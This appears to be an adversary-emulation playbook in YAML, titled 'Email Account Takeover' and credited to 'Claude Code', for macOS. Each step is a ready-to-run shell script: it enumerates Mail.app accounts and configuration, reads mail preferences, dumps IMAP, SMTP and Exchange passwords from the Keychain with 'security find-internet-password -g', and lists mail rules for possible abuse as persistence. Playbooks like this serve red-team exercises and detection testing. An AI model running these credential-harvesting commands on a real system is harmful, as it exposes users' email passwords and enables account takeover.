---
api_version: 2.0
uuid: 67f6d3b0-9e2a-8b83-4f7a-6c1d4e4b8a0f
name: Email Account Takeover
authors:
- Claude Code
description: |
  Enumerate and extract email account configuration and credentials from a macOS system.
  Examines Mail.app account data, reads mail preferences, queries the Keychain for
  IMAP/SMTP passwords, and lists configured mail rules that could be abused.
mitre:
  tactics:
  - TA0001 Initial Access
  techniques:
  - T1078 Valid Accounts
requirements:
  platforms:
  - os: darwin
steps:
- name: enumerate_mail_accounts
  description: Enumerate configured email accounts from Mail.app data
  inline: |
    echo "=== Enumerating Mail.app Accounts ==="
    mail_dir="$HOME/Library/Mail"
    if [ -d "$mail_dir" ]; then
      echo "Mail.app data directory found: $mail_dir"
      ls -la "$mail_dir"/ 2>/dev/null
      echo "--- Mail Account Directories ---"
      find "$mail_dir" -maxdepth 2 -type d -name "*.imapmbox" -o -name "*.mbox" 2>/dev/null | head -20
      echo "--- Account info plists ---"
      find "$mail_dir" -name "AccountInfo.plist" -o -name "Info.plist" 2>/dev/null | head -10 | while read -r plist; do
        echo "Found: $plist"
        plutil -p "$plist" 2>/dev/null | head -20 || true
      done
    else
      echo "Mail.app data directory not found"
    fi
- name: extract_mail_configuration
  description: Extract mail configuration from system defaults
  inline: |
    echo "=== Extracting Mail.app Configuration ==="
    echo "--- Mail Preferences ---"
    defaults read com.apple.mail 2>/dev/null | head -80 || echo "Could not read Mail preferences"
    echo ""
    echo "--- Mail Account Configuration ---"
    defaults read com.apple.mail MailAccounts 2>/dev/null | head -60 || echo "No MailAccounts found"
    echo ""
    echo "--- Internet Accounts ---"
    defaults read com.apple.internetaccounts 2>/dev/null | head -60 || echo "Could not read Internet Accounts"
- name: search_keychain_email_passwords
  description: Search the Keychain for stored email (IMAP/SMTP) passwords
  inline: |
    echo "=== Searching Keychain for Email Credentials ==="
    echo "--- IMAP Passwords ---"
    security find-internet-password -s "imap" -g 2>&1 || true
    security find-internet-password -s "imap.gmail.com" -g 2>&1 || true
    security find-internet-password -s "imap.mail.me.com" -g 2>&1 || true
    security find-internet-password -s "outlook.office365.com" -g 2>&1 || true
    echo "--- SMTP Passwords ---"
    security find-internet-password -s "smtp" -g 2>&1 || true
    security find-internet-password -s "smtp.gmail.com" -g 2>&1 || true
    security find-internet-password -s "smtp.mail.me.com" -g 2>&1 || true
    echo "--- Exchange/ActiveSync ---"
    security find-internet-password -s "outlook" -g 2>&1 || true
    security find-internet-password -s "exchange" -g 2>&1 || true
    echo "--- Generic mail entries ---"
    security find-generic-password -s "com.apple.account.IMAP" 2>&1 || true
    security find-generic-password -s "com.apple.account.SMTP" 2>&1 || true
- name: list_mail_rules
  description: List configured email rules that could be leveraged for persistence or data access
  inline: |
    echo "=== Listing Mail Rules ==="
    rules_plist="$HOME/Library/Mail/V*/MailData/SyncedRules.plist"
    for f in $rules_plist; do
      if [ -f "$f" ]; then
        echo "Found rules file: $f"
        plutil -p "$f" 2>/dev/null | head -50 || true
      fi
    done
    # Also check for rules via defaults
    defaults read com.apple.mail RulesOfType 2>/dev/null | head -30 || echo "No mail rules found via defaults"
    # Check for mail downloads directory
    echo "--- Mail Downloads ---"
    mail_downloads="$HOME/Library/Containers/com.apple.mail/Data/Library/Mail Downloads"
    if [ -d "$mail_downloads" ]; then
      echo "Mail Downloads directory exists:"
      ls -la "$mail_downloads" 2>/dev/null | head -20
    fi
  cleanup:
    inline: |
      echo "Email account enumeration complete. No temporary files to clean up."
tests:
- name: dry_run_test
  dry_run: true
